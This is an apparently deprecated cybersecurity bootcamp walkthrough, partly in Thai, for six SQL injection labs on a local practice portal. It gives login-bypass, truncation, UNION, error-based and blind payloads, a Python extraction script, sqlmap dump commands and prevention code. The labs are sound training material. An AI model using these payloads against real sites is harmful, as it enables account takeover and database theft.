> **DEPRECATED:** This file uses old paths (`/sqli/`) and localhost URLs.
> Please use `walkthrough-sqli-jwt.md` instead, which has:
> - Updated paths: `/resources/` for SQL, `/account/` for JWT
> - Server URL: http://10.10.61.221
> - Current lab configurations

---

# SQL Injection Labs - Complete Walkthrough
# LeaguesOfCode Lab Portal - Cybersecurity Bootcamp #1

> **Target:** LeaguesOfCode Lab Portal - Member Management System
> **URL:** http://localhost:8080/sqli/
> **Database:** MySQL 8.0
> **Difficulty:** Easy → Hard
> **Tools:** Browser, curl, Burp Suite, sqlmap

---

## Lab Overview / ภาพรวม

| Lab | Page | Technique | Difficulty | Time |
|-----|------|-----------|------------|------|
| 0 | Employee Login | Login Bypass | ⭐ Easy | 10 min |
| 1 | HR Registration | SQL Truncation | ⭐⭐ Medium | 15 min |
| 2 | Member Directory | UNION-Based | ⭐⭐ Medium | 20 min |
| 3 | Inventory Search | Error-Based | ⭐⭐ Medium | 20 min |
| 4 | Partner Verification | Blind Boolean | ⭐⭐⭐ Hard | 30 min |
| 5 | Library System | SQLMap (GET/POST) | ⭐⭐ Tool | 20 min |

---

## Pre-requisites / เครื่องมือที่ต้องเตรียม

```bash
# Required Tools
- Web Browser (Chrome/Firefox) + DevTools (F12)
- curl (command line)
- Burp Suite Community Edition
- sqlmap

# Lab Environment
docker-compose up -d
# Access: http://localhost:8080/sqli/
```

---

## MySQL Quick Reference

| Function | Purpose | Example |
|----------|---------|---------|
| `@@version` | MySQL version | `SELECT @@version` |
| `database()` | Current database | `SELECT database()` |
| `user()` | Current user | `SELECT user()` |
| `CONCAT()` | Combine strings | `CONCAT('a','b')` |
| `SUBSTRING()` | Extract part | `SUBSTRING('abc',1,1)` → 'a' |
| `LENGTH()` | String length | `LENGTH('abc')` → 3 |
| `ASCII()` | Char to number | `ASCII('a')` → 97 |
| `extractvalue()` | Error extraction | Forces XPath error |

**Comments:**
- `-- ` (dash dash space)
- `#` (hash)
- `/*comment*/`

---

## Lab 0: Employee Login - Login Bypass
### ระดับ: ⭐ Easy | เวลา: 10 นาที
### URL: `/sqli/lab0_login.php`

### Objective / วัตถุประสงค์
เรียนรู้ SQL Injection พื้นฐาน - การ Bypass หน้า Login โดยไม่ต้องรู้ password

### Feature Purpose / หน้าที่ปกติ
หน้า Login สำหรับพนักงาน LeaguesOfCode เข้าสู่ระบบ HR Portal

### Background / ความรู้พื้นฐาน

**Normal Query:**
```sql
SELECT * FROM users WHERE username='john' AND password='password123'
```

**Injected Query:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1'-- ' AND password='anything'
                                  ^^^^^^^^^^^^^^^^   ^^
                                  Always TRUE        Comment ignores rest
```

### Step-by-Step Walkthrough

#### Step 1: ทดสอบ Login ปกติ
```
1. ไปที่ http://localhost:8080/sqli/lab0_login.php
2. ใส่ Username: test, Password: test
3. กด Login
4. ผลลัพธ์: "Invalid credentials. Please try again."
```

#### Step 2: ทดสอบว่ามีช่องโหว่
```
1. ใส่ Username: '
2. ใส่ Password: anything
3. กด Login
4. ผลลัพธ์: SQL Error message ปรากฏ
```

**Expected Error:**
```
Database Error: You have an error in your SQL syntax;
check the manual that corresponds to your MySQL server version
for the right syntax to use near ''''' at line 1
```

> 💡 **เข้าใจ:** Error บอกเราว่า input ถูกใส่ใน SQL query โดยตรง!

#### Step 3: Bypass Login ด้วย OR Condition

**Payload 1 - Classic OR:**
```
Username: admin' OR '1'='1'--
Password: anything
```

**Payload 2 - Comment with #:**
```
Username: admin'#
Password: anything
```

**Payload 3 - Always True:**
```
Username: ' OR 1=1#
Password: anything
```

#### Step 4: Verify Success

**เมื่อ Bypass สำเร็จจะเห็น:**
```
Welcome, admin!
You have 3 pending leave requests.
Role: admin
Email: admin@leaguesofcode.com
Last Login: 2026-03-04 10:30:00
Dashboard access granted.
```

### Using curl

```bash
# Test normal login
curl -X POST "http://localhost:8080/sqli/lab0_login.php" \
  -d "username=john&password=password123"

# Bypass with OR
curl -X POST "http://localhost:8080/sqli/lab0_login.php" \
  -d "username=admin' OR '1'='1'-- &password=anything"

# Bypass with comment
curl -X POST "http://localhost:8080/sqli/lab0_login.php" \
  -d "username=admin'%23&password=anything"
```

> Note: `%23` = `#` (URL encoded)

### Common Payloads Collection

```sql
-- Basic OR bypass
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
' OR 1=1#

-- Comment password check
admin'--
admin'#
admin'/*

-- Empty password
' OR ''='
') OR ('1'='1

-- Specific user
admin' AND '1'='1'--
```

### Why It Works / ทำไมถึงได้ผล

```
Original Query:
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

With Payload "admin' OR '1'='1'-- ":
SELECT * FROM users WHERE username='admin' OR '1'='1'-- ' AND password='xxx'
                                   ^^^^^^^^^^^^^^^^^    ^^^^^^^^^^^^^^^^^^^
                                   This is TRUE         This is commented out

Result: Returns admin row because OR '1'='1' is always TRUE
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจว่า SQLi เกิดจาก string concatenation
- [ ] สามารถ identify SQLi ด้วยการใส่ `'`
- [ ] เข้าใจ OR condition (`' OR '1'='1`)
- [ ] เข้าใจการใช้ comment (`--` และ `#`)
- [ ] สามารถ bypass login ได้

---

## Lab 1: HR Registration - SQL Truncation
### ระดับ: ⭐⭐ Medium | เวลา: 15 นาที
### URL: `/sqli/lab1_register.php`

### Objective / วัตถุประสงค์
เรียนรู้การยึด account โดยใช้ประโยชน์จาก VARCHAR length limit

### Feature Purpose / หน้าที่ปกติ
หน้าลงทะเบียนพนักงานใหม่ ระบบจะตรวจสอบว่า username ซ้ำหรือไม่

### Background / ความรู้พื้นฐาน

**Database Column:**
```sql
username VARCHAR(20) NOT NULL  -- Max 20 characters
```

**MySQL Behavior:**
1. INSERT ค่าที่ยาวเกิน 20 → MySQL truncates เหลือ 20
2. Trailing spaces ignored ในการเปรียบเทียบ
3. `'admin'` = `'admin     '` ใน MySQL comparison

### Step-by-Step Walkthrough

#### Step 1: ทดสอบ Registration ปกติ
```
1. ไปที่ http://localhost:8080/sqli/lab1_register.php
2. ลงทะเบียน:
   - Username: testuser
   - Password: test123
   - Email: test@test.com
3. ผลลัพธ์: "Registration successful! Please login."
```

#### Step 2: ทดสอบ Duplicate Username
```
1. ลงทะเบียน:
   - Username: admin
   - Password: hacked123
   - Email: hacker@test.com
2. ผลลัพธ์: "Username already exists!"
```

> 💡 **เข้าใจ:** ระบบตรวจสอบว่า admin มีอยู่แล้ว

#### Step 3: SQL Truncation Attack

**สร้าง Payload:**
```
admin               x
^^^^^               ^
5 chars + 15 spaces + 1 char = 21 characters (เกิน 20)
```

**ลงทะเบียน:**
```
Username: admin               x    (admin + 15 spaces + x)
Password: 1234
Email: hacker@test.com
```

**วิธีสร้าง payload ในช่อง input:**
1. พิมพ์ `admin`
2. กด spacebar 15 ครั้ง
3. พิมพ์ `x`

#### Step 4: เข้าใจว่าเกิดอะไรขึ้น

```
1. Application checks: "admin               x" != "admin" → OK, ไม่ซ้ำ
2. INSERT to database: "admin               x" (21 chars)
3. MySQL truncates: "admin               " (20 chars)
4. Trailing spaces = "admin"
5. ตอนนี้มี 2 records ที่ username = "admin" แต่ password ต่างกัน!
```

#### Step 5: Login as Admin

```
1. ไปที่ http://localhost:8080/sqli/lab0_login.php
2. Login:
   - Username: admin
   - Password: 1234
3. ผลลัพธ์: Login สำเร็จ!
```

**Success Text:**
```
Admin Dashboard
Total Members: 156
System Status: Online
Welcome back, Administrator!
```

### Using curl

```bash
# Register with truncation payload (URL encoded spaces)
curl -X POST "http://localhost:8080/sqli/lab1_register.php" \
  -d "username=admin%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20x&password=1234&email=hack@test.com"

# Login with new password
curl -X POST "http://localhost:8080/sqli/lab0_login.php" \
  -d "username=admin&password=1234"
```

### Why It Works / ทำไมถึงได้ผล

```
Step 1: Application Layer
"admin               x" (21 chars)
≠ "admin" (5 chars)
→ Check passes! (Not duplicate)

Step 2: Database Layer (INSERT)
INSERT INTO users (username, password) VALUES ('admin               x', '1234')
→ MySQL truncates to VARCHAR(20)
→ Stored as: "admin               " (20 chars)

Step 3: Database Layer (SELECT on login)
WHERE username = 'admin'
→ MySQL ignores trailing spaces
→ "admin               " = "admin"
→ Match found!

Step 4: Password Check
→ Returns our new row with password '1234'
→ Login successful!
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจ VARCHAR length limit
- [ ] เข้าใจว่า MySQL truncates data silently
- [ ] เข้าใจว่า MySQL ignores trailing spaces
- [ ] สามารถ takeover account ด้วย truncation attack

---

## Lab 2: Member Directory - UNION-Based SQLi
### ระดับ: ⭐⭐ Medium | เวลา: 20 min
### URL: `/sqli/lab2_members.php`

### Objective / วัตถุประสงค์
เรียนรู้การใช้ UNION SELECT เพื่อดึงข้อมูลจาก table อื่น

### Feature Purpose / หน้าที่ปกติ
หน้าค้นหาข้อมูลสมาชิกตาม ID แสดง Name, Email, Department

### Background / ความรู้พื้นฐาน

**UNION Rule:**
- จำนวน column ต้องเท่ากัน
- Data type ต้อง compatible

```sql
SELECT id, name, email FROM members WHERE id = 1
UNION
SELECT 1, 'data', 'data' FROM another_table
```

### Step-by-Step Walkthrough

#### Step 1: ทดสอบหน้าปกติ
```
URL: http://localhost:8080/sqli/lab2_members.php?id=1

ผลลัพธ์: แสดงข้อมูล
| ID | Name     | Email                        | Department  |
|----|----------|------------------------------|-------------|
| 1  | John Doe | john.doe@leaguesofcode.com   | Engineering |
```

#### Step 2: ทดสอบ SQL Injection
```
URL: http://localhost:8080/sqli/lab2_members.php?id=1'

ผลลัพธ์: SQL Error
"You have an error in your SQL syntax..."
```

#### Step 3: หาจำนวน Column (ORDER BY Method)

```
?id=1 ORDER BY 1--    → OK (มี column ที่ 1)
?id=1 ORDER BY 2--    → OK (มี column ที่ 2)
?id=1 ORDER BY 3--    → OK (มี column ที่ 3)
?id=1 ORDER BY 4--    → OK (มี column ที่ 4)
?id=1 ORDER BY 5--    → ERROR! (ไม่มี column ที่ 5)
```

> 💡 **สรุป:** Query มี 4 columns

#### Step 4: หาจำนวน Column (UNION NULL Method)

```
?id=1 UNION SELECT NULL--                    → ERROR
?id=1 UNION SELECT NULL,NULL--               → ERROR
?id=1 UNION SELECT NULL,NULL,NULL--          → ERROR
?id=1 UNION SELECT NULL,NULL,NULL,NULL--     → OK!
```

> 💡 **สรุป:** Query มี 4 columns

#### Step 5: หา Column ที่แสดงผล

```
?id=-1 UNION SELECT 1,2,3,4--
```

> Note: ใช้ `id=-1` เพื่อให้ query แรกไม่ return ผลลัพธ์

**ผลลัพธ์:**
```
| ID | Name | Email | Department |
|----|------|-------|------------|
| 1  | 2    | 3     | 4          |
```

> 💡 **สรุป:** Column 2, 3, 4 แสดงบนหน้าเว็บ

#### Step 6: ดึง Database Version

```
?id=-1 UNION SELECT 1,@@version,3,4--
```

**ผลลัพธ์:**
```
| 1 | 8.0.32 | 3 | 4 |
```

#### Step 7: ดึงชื่อ Database

```
?id=-1 UNION SELECT 1,database(),3,4--
```

**ผลลัพธ์:**
```
| 1 | leaguesofcode_db | 3 | 4 |
```

#### Step 8: ดึง Table Names

```
?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--
```

**ผลลัพธ์ (หลาย rows):**
```
| 1 | users       | 3 | 4 |
| 1 | members     | 3 | 4 |
| 1 | secret_data | 3 | 4 |  ← น่าสนใจ!
| 1 | inventory   | 3 | 4 |
| 1 | partners    | 3 | 4 |
```

**ดูทีละ table (ใช้ LIMIT):**
```
?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--
?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1--
?id=-1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 2,1--
```

#### Step 9: ดึง Column Names จาก secret_data

```
?id=-1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='secret_data'--
```

**ผลลัพธ์:**
```
| 1 | id          | 3 | 4 |
| 1 | data_type   | 3 | 4 |
| 1 | data_value  | 3 | 4 |
| 1 | description | 3 | 4 |
```

#### Step 10: ดึงข้อมูลลับ!

```
?id=-1 UNION SELECT 1,data_type,data_value,4 FROM secret_data--
```

**ผลลัพธ์:**
```
| 1 | admin_pin      | 1337                   | 4 |
| 1 | api_key        | sk_live_abc123xyz789   | 4 |
| 1 | db_password    | sup3rs3cr3tDBp@ss      | 4 |
| 1 | encryption_key | AES256_K3Y_2026!       | 4 |
```

**หรือดึงด้วย CONCAT:**
```
?id=-1 UNION SELECT 1,CONCAT(data_type,': ',data_value),3,4 FROM secret_data--
```

### Using curl

```bash
# Find columns
curl "http://localhost:8080/sqli/lab2_members.php?id=1%20ORDER%20BY%204--"

# Extract database
curl "http://localhost:8080/sqli/lab2_members.php?id=-1%20UNION%20SELECT%201,database(),3,4--"

# Extract secret data
curl "http://localhost:8080/sqli/lab2_members.php?id=-1%20UNION%20SELECT%201,data_type,data_value,4%20FROM%20secret_data--"
```

### UNION Cheat Sheet

```sql
-- Find number of columns
ORDER BY 1--
ORDER BY 2--
... (until error)

-- Alternative: UNION NULL
UNION SELECT NULL--
UNION SELECT NULL,NULL--
... (until success)

-- Find displayed columns
UNION SELECT 1,2,3,4--

-- Extract info
UNION SELECT 1,@@version,3,4--
UNION SELECT 1,database(),3,4--
UNION SELECT 1,user(),3,4--

-- List tables
UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()--

-- List columns
UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='target'--

-- Extract data
UNION SELECT 1,col1,col2,4 FROM target_table--
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจ UNION-based SQLi
- [ ] สามารถหาจำนวน column ได้
- [ ] สามารถหา column ที่แสดงผลได้
- [ ] สามารถใช้ information_schema ได้
- [ ] สามารถดึงข้อมูลจาก table อื่นได้

---

## Lab 3: Inventory Search - Error-Based SQLi
### ระดับ: ⭐⭐ Medium | เวลา: 20 นาที
### URL: `/sqli/lab3_inventory.php`

### Objective / วัตถุประสงค์
เรียนรู้การใช้ SQL Error messages เพื่อดึงข้อมูล

### Feature Purpose / หน้าที่ปกติ
ระบบค้นหาอุปกรณ์ในคลังสินค้า ค้นหาตามชื่อสินค้า

### Background / ความรู้พื้นฐาน

**MySQL Error Functions:**
- `extractvalue(xml, xpath)` - ใช้ XPath syntax error
- `updatexml(xml, xpath, value)` - ใช้ XPath syntax error

**Concept:**
```sql
extractvalue(rand(), concat(0x3a, (SELECT database())))
```
- `0x3a` = `:` (colon) - ทำให้เกิด XPath error
- MySQL แสดงค่าที่เรา SELECT ใน error message

### Step-by-Step Walkthrough

#### Step 1: ทดสอบหน้าปกติ
```
1. ไปที่ http://localhost:8080/sqli/lab3_inventory.php
2. Search: Laptop
3. ผลลัพธ์: แสดงรายการ Laptop Dell XPS 15
```

#### Step 2: ทดสอบ SQL Injection
```
Search: '

ผลลัพธ์:
Database Error:
You have an error in your SQL syntax...
```

> 💡 **เข้าใจ:** Error message แสดง = สามารถทำ Error-based ได้

#### Step 3: Extract Database Version

```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT version()))) #
```

**ผลลัพธ์ (Error message):**
```
Database Error:
XPATH syntax error: ':8.0.32'
                     ^^^^^^^^
                     Version ที่เราต้องการ!
```

#### Step 4: Extract Database Name

```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT database()))) #
```

**ผลลัพธ์:**
```
XPATH syntax error: ':leaguesofcode_db'
```

#### Step 5: Extract Table Names

```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) #
```

**ผลลัพธ์:**
```
XPATH syntax error: ':users'
```

**ดู table ถัดไป (เปลี่ยน LIMIT):**
```
LIMIT 0,1  → :users
LIMIT 1,1  → :members
LIMIT 2,1  → :secret_data    ← Target!
LIMIT 3,1  → :inventory
LIMIT 4,1  → :partners
```

#### Step 6: Extract Column Names

```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='secret_data' LIMIT 0,1))) #
```

**ผลลัพธ์:**
```
LIMIT 0,1  → :id
LIMIT 1,1  → :data_type
LIMIT 2,1  → :data_value
LIMIT 3,1  → :description
```

#### Step 7: Extract Secret Data!

**ดึง data_type:**
```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT data_type FROM secret_data LIMIT 0,1))) #
```
**ผลลัพธ์:** `:admin_pin`

**ดึง data_value:**
```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT data_value FROM secret_data LIMIT 0,1))) #
```
**ผลลัพธ์:** `:1337`

**ดึง db_password:**
```
Search: ' AND extractvalue(rand(), concat(0x3a, (SELECT data_value FROM secret_data WHERE data_type='db_password'))) #
```
**ผลลัพธ์:** `:sup3rs3cr3tDBp@ss`

### Alternative: updatexml()

```sql
' AND updatexml(null, concat(0x3a, (SELECT database())), null) #
' AND updatexml(null, concat(0x3a, (SELECT data_value FROM secret_data LIMIT 0,1)), null) #
```

### Using curl

```bash
# Extract version
curl -X POST "http://localhost:8080/sqli/lab3_inventory.php" \
  -d "search=' AND extractvalue(rand(), concat(0x3a, (SELECT version()))) #"

# Extract secret
curl -X POST "http://localhost:8080/sqli/lab3_inventory.php" \
  -d "search=' AND extractvalue(rand(), concat(0x3a, (SELECT data_value FROM secret_data WHERE data_type='db_password'))) #"
```

### Error-Based Cheat Sheet

```sql
-- extractvalue method
' AND extractvalue(rand(), concat(0x3a, (QUERY))) #

-- updatexml method
' AND updatexml(null, concat(0x3a, (QUERY)), null) #

-- Common queries
(SELECT version())
(SELECT database())
(SELECT user())
(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)
(SELECT column_name FROM information_schema.columns WHERE table_name='x' LIMIT 0,1)
(SELECT column FROM table LIMIT 0,1)
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจ Error-Based SQLi
- [ ] สามารถใช้ extractvalue() ได้
- [ ] สามารถใช้ updatexml() ได้
- [ ] เข้าใจ 0x3a (hex) = `:` (colon)
- [ ] สามารถดึงข้อมูลจาก error message ได้

---

## Lab 4: Partner Verification - Blind Boolean SQLi
### ระดับ: ⭐⭐⭐ Hard | เวลา: 30 นาที
### URL: `/sqli/lab4_partner.php`

### Objective / วัตถุประสงค์
เรียนรู้การดึงข้อมูลเมื่อไม่มี error message โดยใช้ TRUE/FALSE responses

### Feature Purpose / หน้าที่ปกติ
ระบบตรวจสอบสถานะพันธมิตร แสดงผลแค่ "Verified" หรือ "Not Found"

### Background / ความรู้พื้นฐาน

**Blind SQLi Concept:**
- ไม่มี error message
- ไม่มี data แสดงผล
- มีแค่ TRUE/FALSE (Verified/Not Found)
- ต้องถามคำถาม Yes/No ทีละคำถาม

### Step-by-Step Walkthrough

#### Step 1: ทดสอบหน้าปกติ
```
URL: ?code=LOC001
ผลลัพธ์: "Partner Verified ✓ - Partner code is valid and active."

URL: ?code=XXXXX
ผลลัพธ์: "Partner Not Found ✗ - Invalid partner code or inactive status."
```

#### Step 2: ทดสอบ Boolean Condition

```
?code=LOC001' AND '1'='1
ผลลัพธ์: Partner Verified ✓ (TRUE)

?code=LOC001' AND '1'='2
ผลลัพธ์: Partner Not Found ✗ (FALSE)
```

> 💡 **เข้าใจ:** เราสามารถถามคำถาม TRUE/FALSE ได้!

#### Step 3: หาความยาวของ secret_key

**Target:** Partner LOC001 มี secret_key อะไร?

```
?code=LOC001' AND LENGTH((SELECT secret_key FROM partners WHERE partner_code='LOC001'))>5--
ผลลัพธ์: Verified (TRUE) - ยาวกว่า 5

?code=LOC001' AND LENGTH((SELECT secret_key FROM partners WHERE partner_code='LOC001'))>15--
ผลลัพธ์: Not Found (FALSE) - ไม่ยาวกว่า 15

?code=LOC001' AND LENGTH((SELECT secret_key FROM partners WHERE partner_code='LOC001'))>10--
ผลลัพธ์: Not Found (FALSE) - ไม่ยาวกว่า 10

?code=LOC001' AND LENGTH((SELECT secret_key FROM partners WHERE partner_code='LOC001'))=10--
ผลลัพธ์: Verified (TRUE) - ยาว 10 ตัวอักษร!
```

> 💡 **สรุป:** secret_key มี 10 ตัวอักษร

#### Step 4: Extract ทีละตัวอักษร (Slow Method)

**ตัวที่ 1:**
```
?code=LOC001' AND SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1)='a'--
ผลลัพธ์: Not Found (FALSE)

?code=LOC001' AND SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1)='s'--
ผลลัพธ์: Verified (TRUE) ← ตัวแรก = 's'
```

**ตัวที่ 2:**
```
?code=LOC001' AND SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),2,1)='3'--
ผลลัพธ์: Verified (TRUE) ← ตัวที่ 2 = '3'
```

**ทำต่อไปจนครบ 10 ตัว:**
```
Position 1: s
Position 2: 3
Position 3: c
Position 4: r
Position 5: 3
Position 6: t
Position 7: P
Position 8: @
Position 9: s
Position 10: s

Result: s3cr3tP@ss
```

#### Step 5: Binary Search (Fast Method)

**ใช้ ASCII comparison แทน:**
```
# ตัวที่ 1: ASCII('s') = 115
?code=LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1))>100--
Verified (TRUE) - มากกว่า 100

?code=LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1))>120--
Not Found (FALSE) - ไม่มากกว่า 120

?code=LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1))>110--
Verified (TRUE)

?code=LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1))>115--
Not Found (FALSE)

?code=LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),1,1))=115--
Verified (TRUE) ← ASCII 115 = 's'
```

> 💡 **Binary Search:** ลดจาก ~95 requests เหลือ ~7 requests ต่อตัวอักษร!

### Python Automation Script

```python
import requests

url = "http://localhost:8080/sqli/lab4_partner.php"
secret = ""

print("[*] Extracting secret_key for LOC001...")

# Extract 10 characters
for position in range(1, 11):
    low, high = 32, 127  # Printable ASCII range

    while low < high:
        mid = (low + high) // 2
        payload = f"LOC001' AND ASCII(SUBSTRING((SELECT secret_key FROM partners WHERE partner_code='LOC001'),{position},1))>{mid}-- "

        response = requests.get(url, params={"code": payload})

        if "Partner Verified" in response.text:
            low = mid + 1
        else:
            high = mid

    secret += chr(low)
    print(f"[+] Position {position}: {chr(low)} -> {secret}")

print(f"\n[*] Secret Key: {secret}")
```

**Output:**
```
[*] Extracting secret_key for LOC001...
[+] Position 1: s -> s
[+] Position 2: 3 -> s3
[+] Position 3: c -> s3c
[+] Position 4: r -> s3cr
[+] Position 5: 3 -> s3cr3
[+] Position 6: t -> s3cr3t
[+] Position 7: P -> s3cr3tP
[+] Position 8: @ -> s3cr3tP@
[+] Position 9: s -> s3cr3tP@s
[+] Position 10: s -> s3cr3tP@ss

[*] Secret Key: s3cr3tP@ss
```

### Blind SQLi Cheat Sheet

```sql
-- Boolean test
' AND '1'='1    (TRUE)
' AND '1'='2    (FALSE)

-- Length check
' AND LENGTH((SELECT ...))>10--
' AND LENGTH((SELECT ...))=10--

-- Character extraction (slow)
' AND SUBSTRING((SELECT ...),1,1)='a'--

-- ASCII extraction (for binary search)
' AND ASCII(SUBSTRING((SELECT ...),1,1))>100--
' AND ASCII(SUBSTRING((SELECT ...),1,1))=115--

-- Alternative functions
MID((SELECT ...),1,1)
SUBSTR((SELECT ...),1,1)
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] เข้าใจ Blind Boolean SQLi
- [ ] สามารถใช้ TRUE/FALSE conditions ได้
- [ ] สามารถหา LENGTH ของ string ได้
- [ ] สามารถ extract ทีละ character ได้
- [ ] เข้าใจ Binary Search technique
- [ ] สามารถเขียน automation script ได้

---

## Lab 5: Library System - SQLMap Practice
### ระดับ: ⭐⭐ Tool Practice | เวลา: 20 นาที
### URL: `/sqli/lab5_library.php` และ `/sqli/lab5_request.php`

### Objective / วัตถุประสงค์
เรียนรู้การใช้ SQLMap กับ GET และ POST requests

### Feature Purpose / หน้าที่ปกติ
ระบบห้องสมุด: ค้นหาหนังสือ (GET) และขอยืมหนังสือ (POST)

---

### Part A: SQLMap with GET Request

**URL:** `http://localhost:8080/sqli/lab5_library.php?id=1`

#### Step 1: Test Manually
```
?id=1 → แสดงหนังสือ "Clean Code"
?id=1' → SQL Error
```

#### Step 2: Basic SQLMap Scan

```bash
sqlmap -u "http://localhost:8080/sqli/lab5_library.php?id=1" --batch
```

**Output:**
```
[*] testing 'AND boolean-based blind'
[*] testing 'MySQL >= 5.0 AND error-based'
[*] testing 'MySQL >= 5.0 OR error-based'
...
sqlmap identified the following injection point(s):
Parameter: id (GET)
    Type: boolean-based blind
    Type: error-based
    Type: UNION query
```

#### Step 3: List Databases

```bash
sqlmap -u "http://localhost:8080/sqli/lab5_library.php?id=1" --dbs --batch
```

**Output:**
```
available databases [2]:
[*] information_schema
[*] leaguesofcode_db
```

#### Step 4: List Tables

```bash
sqlmap -u "http://localhost:8080/sqli/lab5_library.php?id=1" -D leaguesofcode_db --tables --batch
```

**Output:**
```
Database: leaguesofcode_db
[7 tables]
+-------------+
| accounts    |
| books       |
| inventory   |
| members     |
| partners    |
| secret_data |
| users       |
+-------------+
```

#### Step 5: List Columns

```bash
sqlmap -u "http://localhost:8080/sqli/lab5_library.php?id=1" -D leaguesofcode_db -T secret_data --columns --batch
```

#### Step 6: Dump Data

```bash
sqlmap -u "http://localhost:8080/sqli/lab5_library.php?id=1" -D leaguesofcode_db -T secret_data --dump --batch
```

**Output:**
```
+----+----------------+----------------------+
| id | data_type      | data_value           |
+----+----------------+----------------------+
| 1  | admin_pin      | 1337                 |
| 2  | api_key        | sk_live_abc123xyz789 |
| 3  | db_password    | sup3rs3cr3tDBp@ss    |
| 4  | encryption_key | AES256_K3Y_2026!     |
+----+----------------+----------------------+
```

---

### Part B: SQLMap with POST Request

**URL:** `http://localhost:8080/sqli/lab5_request.php`

#### Step 1: Capture Request with Burp Suite

1. เปิด Burp Suite → Proxy → Intercept ON
2. ไปที่หน้า Book Request form
3. กรอก Book ID: 1, Name: Test
4. Submit
5. Burp captures request
6. Right-click → "Copy to file" → บันทึกเป็น `request.txt`

**ไฟล์ request.txt:**
```http
POST /sqli/lab5_request.php HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

book_id=1&requester=Test
```

#### Step 2: Run SQLMap with -r Option

```bash
# Basic scan
sqlmap -r request.txt --batch

# Specify parameter
sqlmap -r request.txt -p book_id --batch

# List databases
sqlmap -r request.txt -p book_id --dbs --batch

# Dump secret_data
sqlmap -r request.txt -p book_id -D leaguesofcode_db -T secret_data --dump --batch
```

### SQLMap Options Reference

```bash
# ========== BASIC ==========
-u "URL"                    # Target URL (GET)
-r request.txt              # Request file (POST)
--batch                     # Non-interactive mode

# ========== ENUMERATION ==========
--dbs                       # List databases
-D dbname --tables          # List tables
-D dbname -T table --columns   # List columns
-D dbname -T table --dump      # Dump data

# ========== PARAMETERS ==========
-p parameter                # Specific parameter to test
--data="param=value"        # POST data inline

# ========== TECHNIQUES ==========
--technique=B               # Boolean-based blind
--technique=E               # Error-based
--technique=U               # Union-based
--technique=T               # Time-based blind
--technique=BEUST           # All techniques

# ========== VERBOSITY ==========
-v 0                        # Minimal
-v 1                        # Default
-v 3                        # Recommended for learning

# ========== ADVANCED ==========
--threads=10                # Faster extraction
--risk=3                    # More aggressive
--level=5                   # More tests
```

### Checklist / สิ่งที่ได้เรียนรู้
- [ ] สามารถใช้ SQLMap กับ GET request (-u)
- [ ] สามารถ capture request ด้วย Burp Suite
- [ ] สามารถใช้ SQLMap กับ POST request (-r)
- [ ] เข้าใจ SQLMap options (--dbs, --tables, --dump)
- [ ] สามารถ enumerate และ dump ข้อมูลได้

---

## Summary / สรุป

| Lab | Technique | Extracted Data |
|-----|-----------|----------------|
| 0 | Login Bypass | Access as admin |
| 1 | SQL Truncation | Takeover admin account |
| 2 | UNION-Based | admin_pin: 1337, api_key, db_password |
| 3 | Error-Based | sup3rs3cr3tDBp@ss (in error) |
| 4 | Blind Boolean | s3cr3tP@ss (character by character) |
| 5 | SQLMap | Full database dump |

---

## Prevention / การป้องกัน

```php
// ✅ Use Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

// ✅ Input Validation
if (strlen($username) > 20) {
    die("Username too long");
}

// ✅ Whitelist Input
$allowed = ['id', 'name', 'date'];
if (!in_array($sort, $allowed)) {
    $sort = 'id';
}

// ✅ Hide Errors in Production
ini_set('display_errors', 0);
error_log($error);

// ✅ Least Privilege
// Database user should only have SELECT, INSERT, UPDATE, DELETE
// NOT: FILE, PROCESS, SUPER
```

---

> **Disclaimer**: This walkthrough is for educational purposes only. Only test on systems you own or have explicit permission to test.
